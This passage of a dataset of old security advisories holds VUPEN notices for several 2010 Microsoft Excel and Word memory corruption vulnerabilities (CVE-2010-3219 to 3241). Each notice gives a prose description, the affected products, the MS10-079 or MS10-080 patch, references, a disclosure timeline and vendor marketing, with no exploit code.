* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3241
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14116,VUPEN Security Research - Microsoft Office Excel RealTimeData Array Indexing Vulnerability (CVE-2010-3240),,CVE-2010-3240,"VUPEN Security Research - Microsoft Office Excel RealTimeData Array Indexing Vulnerability (CVE-2010-3240)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by an array indexing error when processing
RealTimeData records in an Excel file, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2007 Service Pack 2
Microsoft Office XP Service Pack 3
Microsoft Office Compatibility Pack for Word, Excel, and PowerPoint 2007 File Formats Service Pack 2
Microsoft Excel Viewer Service Pack 2
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3240
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14117,VUPEN Security Research - Microsoft Office Excel Extra PtgExtraArray Parsing Vulnerability (CVE-2010-3239),,CVE-2010-3239,"VUPEN Security Research - Microsoft Office Excel Extra PtgExtraArray Parsing Vulnerability (CVE-2010-3239)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by a memory corruption error when processing
PtgExtraArray structures in an Excel file, which could be exploited
by remote attackers to execute arbitrary code by tricking a user into
opening a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3239
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14118,VUPEN Security Research - Microsoft Office Excel Negative Future Function Vulnerability (CVE-2010-3238),,CVE-2010-3238,"VUPEN Security Research - Microsoft Office Excel Negative Future Function Vulnerability (CVE-2010-3238)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by a memory corruption error when processing
a negative future function while parsing an Excel file, which could be exploited
by remote attackers to execute arbitrary code by tricking a user into
opening a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office 2003 Service Pack 3
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3238
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14119,VUPEN Security Research - Microsoft Office Excel Merge Cell Record Invalid Pointer Vulnerability (CVE-2010-3237),,CVE-2010-3237,"VUPEN Security Research - Microsoft Office Excel Merge Cell Record Invalid Pointer Vulnerability (CVE-2010-3237)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by an invalid pointer when processing
malformed Merge Cell records in an Excel file, which could be exploited
by remote attackers to execute arbitrary code by tricking a user into
opening a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3237
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14120,VUPEN Security Research - Microsoft Office Excel Record Array Indexing Vulnerability (CVE-2010-3236),,CVE-2010-3236,"VUPEN Security Research - Microsoft Office Excel Record Array Indexing Vulnerability (CVE-2010-3236)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by an array indexing error when processing
certain records in an Excel file, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office 2008 for Mac
Microsoft Office 2003 Service Pack 3
Microsoft Office XP Service Pack 3
Open XML File Format Converter for Mac
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3236
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14121,VUPEN Security Research - Microsoft Office Excel Formula Record Dangling Pointer Vulnerability (CVE-2010-3235),,CVE-2010-3235,"VUPEN Security Research - Microsoft Office Excel Formula Record Dangling Pointer Vulnerability (CVE-2010-3235)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by a dangling pointer when processing
certain Formula records in an Excel file, which could be exploited
by remote attackers to execute arbitrary code by tricking a user into
opening a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3235
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14122,VUPEN Security Research - Microsoft Office Excel Formula Substream Memory Corruption (CVE-2010-3234),,CVE-2010-3234,"VUPEN Security Research - Microsoft Office Excel Formula Substream Memory Corruption (CVE-2010-3234)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by a memory corruption error when parsing
Formula Substream records in an Excel file, which could be exploited
by remote attackers to execute arbitrary code by tricking a user into
opening a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3234
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14123,VUPEN Security Research - Microsoft Office Excel Formula Record Buffer Overflow Vulnerability (CVE-2010-3231),,CVE-2010-3231,"VUPEN Security Research - Microsoft Office Excel Formula Record Buffer Overflow Vulnerability (CVE-2010-3231)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by a buffer overflow error when parsing
Formula records in an Excel file, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2008 for Mac
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
Open XML File Format Converter for Mac
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3231
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14124,VUPEN Security Research - Microsoft Office Word Short Sign Memory Corruption Vulnerability (CVE-2010-3221),,CVE-2010-3221,"VUPEN Security Research - Microsoft Office Word Short Sign Memory Corruption Vulnerability (CVE-2010-3221)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by a memory corruption when parsing certain
data in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office 2003 Service Pack 3
Microsoft Office XP Service Pack 3
Microsoft Word Viewer
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3221
X. DISCLOSURE TIMELINE
-----------------------------
2010-05-05 - Vendor notified
2010-05-05 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14125,VUPEN Security Research - Microsoft Office Word LVL Structure Heap Overflow Vulnerability (CVE-2010-3220),,CVE-2010-3220,"VUPEN Security Research - Microsoft Office Word LVL Structure Heap Overflow Vulnerability (CVE-2010-3220)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by a heap overflow error when processing
LVL structures in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2626
http://www.microsoft.com/technet/security/bulletin/ms10-079.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3220
X. DISCLOSURE TIMELINE
-----------------------------
2010-05-05 - Vendor notified
2010-05-05 - Vendor response
2010-08-09 - Status update received
2010-10-12 - Coordinated public Disclosure"
14126,VUPEN Security Research - Microsoft Office Word BKF Objects Array Indexing Vulnerability (CVE-2010-3219),,CVE-2010-3219,"VUPEN Security Research - Microsoft Office Word BKF Objects Array Indexing Vulnerability (CVE-2010-3219)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Word, included in the Microsoft Office suite,
is a powerful authoring program that gives the ability to create
and share documents by combining a comprehensive set of writing
tools with the easy-to-use Microsoft Office Fluent user interface.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Word.
The vulnerability is caused by an array indexing error when processing
BKF objects in a Word document, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Word file.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-079 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
